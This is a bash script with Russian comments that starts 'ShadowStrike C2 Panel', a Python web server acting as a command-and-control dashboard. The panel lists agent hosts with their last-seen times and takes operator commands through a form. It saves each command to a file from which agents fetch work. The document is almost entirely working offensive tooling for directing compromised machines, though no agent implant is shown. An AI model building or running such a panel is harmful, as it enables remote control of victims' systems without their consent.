#!/bin/bash
# ShadowStrike C2 Panel — своя веб-панель управления агентами
PANEL_PORT=${1:-5000}
AGENTS_DIR="$HOME/.shadow_agents"
mkdir -p "$AGENTS_DIR"

echo "[C2-PANEL] Запускаю веб-панель на порту $PANEL_PORT..."

python3 -c "
import http.server, json, os, time

AGENTS_DIR = '$AGENTS_DIR'

class Panel(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        agents = []
        for f in os.listdir(AGENTS_DIR):
            if f.endswith('.agent'):
                try:
                    with open(os.path.join(AGENTS_DIR, f)) as af:
                        data = json.load(af)
                        agents.append(data)
                except: pass
        
        html = '''<html><head><title>ShadowStrike C2</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
            .card { background: #111; border: 1px solid #333; padding: 15px; margin: 10px; border-radius: 8px; }
            h1 { color: #f00; }
            .agent { border-left: 3px solid #0f0; padding-left: 10px; margin: 10px 0; }
            .offline { border-left-color: #f00; }
            .cmd { background: #000; color: #0f0; border: 1px solid #333; padding: 8px; width: 70%; }
            .btn { background: #f00; color: #fff; border: none; padding: 8px 16px; cursor: pointer; }
        </style></head>
        <body><h1>ShadowStrike C2 Panel</h1>
        <div class=\"card\">
        <h2>Agents (''' + str(len(agents)) + ''')</h2>'''
        
        for a in agents:
            status = 'offline' if time.time() - a.get('last_seen', 0) > 300 else ''
            html += f\"<div class='agent {status}'>\"
            html += f\"<b>{a.get('hostname','?')}</b> — {a.get('env','?')}<br>\"
            html += f\"Last seen: {time.ctime(a.get('last_seen',0))}\"
            html += '</div>'
        
        html += '''</div>
        <div class=\"card\">
        <h2>Send Command</h2>
        <form method=\"POST\" action=\"/cmd\">
        <input class=\"cmd\" name=\"cmd\" placeholder=\"whoami\">
        <button class=\"btn\" type=\"submit\">Execute</button>
        </form></div></body></html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len).decode()
        cmd = body.split('=')[-1] if '=' in body else body
        
        # Сохраняем команду для агентов
        with open(os.path.join(AGENTS_DIR, 'pending_cmd.txt'), 'w') as f:
            f.write(cmd)
        
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

print(f'[C2-PANEL] https://0.0.0.0:$PANEL_PORT')
http.server.HTTPServer(('0.0.0.0', $PANEL_PORT), Panel).serve_forever()
" &
echo "[C2-PANEL] Панель запущена: http://localhost:$PANEL_PORT"
